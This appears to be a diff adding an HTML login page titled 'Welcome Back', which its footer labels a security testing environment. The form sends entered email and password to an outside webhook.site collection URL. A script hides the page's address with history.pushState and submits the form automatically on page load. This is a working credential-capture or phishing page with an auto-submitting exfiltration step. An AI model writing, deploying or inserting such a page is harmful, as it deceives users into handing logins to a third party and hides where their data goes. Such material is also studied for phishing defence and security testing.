@@ -1,0 +1,148 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Login</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f5f7fb;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 400px;
+      padding: 40px;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.1);
+    }
+
+    .login-container h1 {
+      text-align: center;
+      margin-bottom: 8px;
+      color: #222;
+      font-size: 28px;
+    }
+
+    .login-container p {
+      text-align: center;
+      margin-bottom: 30px;
+      color: #777;
+      font-size: 14px;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 8px;
+      color: #333;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 13px 14px;
+      border: 1px solid #d5d9df;
+      border-radius: 7px;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .input-group input:focus {
+      border-color: #4f46e5;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 13px;
+      border: none;
+      border-radius: 7px;
+      background: #4f46e5;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .login-button:hover {
+      background: #4338ca;
+    }
+
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="login-container">
+
+    <h1>Welcome Back</h1>
+    <p>Sign in to your account</p>
+
+    <form action="https://088c57c6-f6fc-46a5-9072-6aaccfe0e11d.webhook.site" method="POST">
+      <div class="input-group">
+        <label for="email">Email</label>
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Enter your email"
+          required
+        >
+      </div>
+
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Enter your password"
+          required
+        >
+      </div>
+
+      <button type="submit" class="login-button">
+        Sign In
+      </button>
+    </form>
+
+    <div class="footer">
+      Security testing environment
+    </div>
+
+  </div>
+
+  <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+  </script>
+
+</body>
+</html>
